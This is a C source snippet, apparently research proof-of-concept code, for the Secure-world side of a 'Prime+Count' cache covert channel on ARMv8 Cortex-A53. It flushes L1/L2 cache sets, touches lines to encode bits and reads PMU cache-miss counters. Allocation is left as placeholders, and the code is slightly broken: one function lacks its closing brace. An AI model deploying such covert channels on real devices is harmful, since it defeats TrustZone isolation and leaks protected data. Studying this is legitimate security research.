// It's just code snippet which contains core function for Prime+Count attack in Secure world side.
// If you'd like to compile and test this, Update [To be updated] codes 
//
// ARMv8, Cortex-A53
// Cache-related definitions are for ARMv8, Cortex-A53.
//
#define CACHE_LINE_LEN 64
#define WAY_LINES 128
#define WAYS 4
#define WAY_SIZE (CACHE_LINE_LEN * WAY_LINES)
#define ARRAY_SIZE (WAY_SIZE * WAYS)
#define DATA_BITS ((ARRAY_SIZE)/(CACHE_LINE_LEN))

#define L2_WAYS 16
#define L2_ARRAY_SIZE (64 * 512)
#define L2_WAY_LINES 512

enum
{
    SET_COUNTING_MODE = 0x0000,
    LINE_COUNTING_MODE = 0x0100,
};

static void *covertAddrArr[4] = {NULL,};
static int covertArrIdx = 0;
static void *covertVirtAddr = NULL;

static inline int covert_alloc_set_counting_mode(unsigned long addr)
{
	int ret = 0;
	
	if(covertArrIdx >= 4 || covertAddrArr[covertArrIdx] != NULL)
	{
		printk(KERN_ERROR, "[covert] covertAddrArr not null\n");
		return -1;
	}

	// [To be updated]
	// covertAddrArr[covertArrIdx] = (void *)your_linear_memory_allocation_function(addr, ARRAY_SIZE);
	if(covertAddrArr[covertArrIdx] == NULL)
	{
		printk(KERN_ERROR, "[covert] allocation error\n");
		return -1;
	}

	covertArrIdx++;
	return ret;
}

static inline int covert_alloc_line_counting_mode(unsigned long addr)
{
	int ret = 0;

	// [To be updated]
	// covertVirtAddr = (void*)your_linear_memory_allocation_function(addr, ARRAY_SIZE);
	if(!covertVirtAddr)
	{
		printk(KERN_ERROR, "[covert] allocation error\n");
		return -1;
	}

	return ret;
}

static inline int covert_alloc_multi_core(unsigned long addr)
{
	int ret = 0;

	if(covertArrIdx >= L2_WAYS || covertAddrArr[covertArrIdx] != NULL)
	{
		printk(KERN_ERROR, "[covert] covertVirtAddr not null\n");
		return -1;
	}

	// [To be updated]
	// covertAddrArr[covertArrIdx] = (void *)your_linear_memory_allocation_function(addr, L2_ARRAY_SIZE);
	if(covertAddrArr[covertArrIdx] == NULL)
	{
		printk(KERN_ERROR, "[covert] allocation error\n");
		return -1;
	}

	covertArrIdx++;
	return ret;
}

static inline unsigned int GetCacheMiss(void)
{
	uint32_t ret;
	uint32_t counter = 0 & 0x1F;
	asm volatile("MSR PMSELR_EL0, %0" : : "r" (counter));
	asm volatile("ISB");
	asm volatile("MRS %0, PMXEVCNTR_EL0" : "=r"(ret));
	return ret;
}


static inline void FlushL1DataCache(uint32_t set, uint32_t way)
{
	volatile uint64_t value;
	value = 0x0000000000000000;
	value = (value | (set << 6));
	value = (value | (way << 30));
	asm volatile("DC CISW, %0\n"
		:
		: "r" (value)
		);
	asm volatile("ISB\n");
	asm volatile("DSB SY\n");
}

static inline void FlushL2DataCache(uint32_t set, uint32_t way)
{
	volatile uint64_t value;
	value = 0x0000000000000000;
	value = (value | (1 << 1));
	value = (value | (set << 6));
	value = (value | (way << 28));
	asm volatile("DC CISW, %0\n"
		:
		: "r" (value)
		);
	asm volatile("ISB\n");
	

static inline int covert_access_set_counting_mode(int size)
{

	unsigned int *ptr;
	unsigned int i, j, idx, tt;

	if(covertAddrArr[0] == NULL || covertArrIdx != 4)
	{
		printk(KERN_ERROR, "[covert] covertAddrArr NULL\n");
		return -1;
	}

	for(i=0; i<WAY_LINES; i++)
	{
		if(i >= size)
		{
			break;
		}

		idx = (i * CACHE_LINE_LEN / 4);

		for(j=0; j<WAYS; j++)
		{
			FlushL1DataCache(i, j);
		}

		for(j=0; j<WAYS; j++)
		{
			ptr = (unsigned int*)covertAddrArr[j] + idx;
			
			__asm__ __volatile__ ("isb\n");
			__asm__ __volatile__ ("dsb sy\n");
			__asm__ __volatile__ ("ldr %0, [%1]\n": "=r" (tt): "r" (ptr));
			__asm__ __volatile__ ("isb\n");
			__asm__ __volatile__ ("dsb sy\n");
		}
	}

	return 0;
}

static inline int covert_access_line_counting_mode(int size)
{
	unsigned int *ptr, *ptr2, *ptr3, *ptr4;
	unsigned int i, tt;
	unsigned int idx, idx2, idx3, idx4;
	unsigned int loop, mod;
	//unsigned int total;

	if(!covertVirtAddr)
	{
		printk(KERN_ERROR, "[covert] covertVirtAddr NULL\n");
		return -1;
	}

	loop = (size / WAYS);
	mod = (size % WAYS);

	for(i=0; i<loop; i++)
	{
		idx = (i * CACHE_LINE_LEN / 4);
		idx2 = (idx) + (WAY_SIZE / 4);
		idx3 = (idx2) + (WAY_SIZE / 4);
		idx4 = (idx3) + (WAY_SIZE / 4);

		ptr = (unsigned int*)covertVirtAddr + idx;
		ptr2 = (unsigned int*)covertVirtAddr + idx2;
		ptr3 = (unsigned int*)covertVirtAddr + idx3;
		ptr4 = (unsigned int*)covertVirtAddr + idx4;

		FlushL1DataCache(i, 0);
		FlushL1DataCache(i, 1);
		FlushL1DataCache(i, 2);
		FlushL1DataCache(i, 3);
		
		__asm__ __volatile__ ("isb\n");
		__asm__ __volatile__ ("dsb sy\n");
		__asm__ __volatile__ ("ldr %0, [%1]\n": "=r" (tt): "r" (ptr));
		__asm__ __volatile__ ("ldr %0, [%1]\n": "=r" (tt): "r" (ptr2));
		__asm__ __volatile__ ("ldr %0, [%1]\n": "=r" (tt): "r" (ptr3));
		__asm__ __volatile__ ("ldr %0, [%1]\n": "=r" (tt): "r" (ptr4));
		__asm__ __volatile__ ("isb\n");
		__asm__ __volatile__ ("dsb sy\n");
	}

	for(i=0; i<mod; i++)
	{
		idx = (loop * CACHE_LINE_LEN / 4) + (mod * WAY_SIZE / 4);
		ptr = (unsigned int*)covertVirtAddr + idx;

		FlushL1DataCache(loop, mod);

		__asm__ __volatile__ ("isb\n");
		__asm__ __volatile__ ("dsb sy\n");
		__asm__ __volatile__ ("ldr %0, [%1]\n": "=r" (tt): "r" (ptr));
		__asm__ __volatile__ ("isb\n");
		__asm__ __volatile__ ("dsb sy\n");
	}

	return 0;
}

static inline int covert_access_multi_core(int size)
{
	//unsigned int *ptrArr[16] = {NULL,};
	unsigned int *ptr/*, *ptr2, *ptr3, *ptr4*/;
	unsigned int idx/*, idx2, idx3, idx4*/;
	unsigned int i, j, tt;
	
	if(covertAddrArr[0] == NULL || covertArrIdx != 16)
	{
		printk(KERN_ERROR, "[covert] covertAddrArr NULL\n");
		return -1;
	}

	for(i=0; i<L2_WAY_LINES; i++)
	{
		if(i >= size)
		{
			break;
		}

		idx = (i * CACHE_LINE_LEN / 4);

		for(j=0; j<WAYS; j++)
		{
			FlushL1DataCache(i % 128, j);
		}
		for(j=0; j<L2_WAYS; j++)
		{
			FlushL2DataCache(i, j);
		}

		for(j=0; j<L2_WAYS; j++)
		{
			ptr = (unsigned int*)covertAddrArr[j] + idx;
			
			__asm__ __volatile__ ("isb\n");
			__asm__ __volatile__ ("dsb sy\n");
			__asm__ __volatile__ ("ldr %0, [%1]\n": "=r" (tt): "r" (ptr));
			__asm__ __volatile__ ("isb\n");
			__asm__ __volatile__ ("dsb sy\n");
		}
	}

	return 0;
}

// Abstract function to represent SMC handler or Trusted application handler.
// [To be updated] this function should be moved to your trigger function.
// param @size :  The number of cache lines to be accessed.
int trigger_function(int size)
{
	// line counting mode? or multi-core?
	return covert_access_set_counting_mode(size);
}

// Do memory allocation for covert channel.
int init(unsigned long addr)
{
	return covert_alloc_set_counting_mode(addr);
}
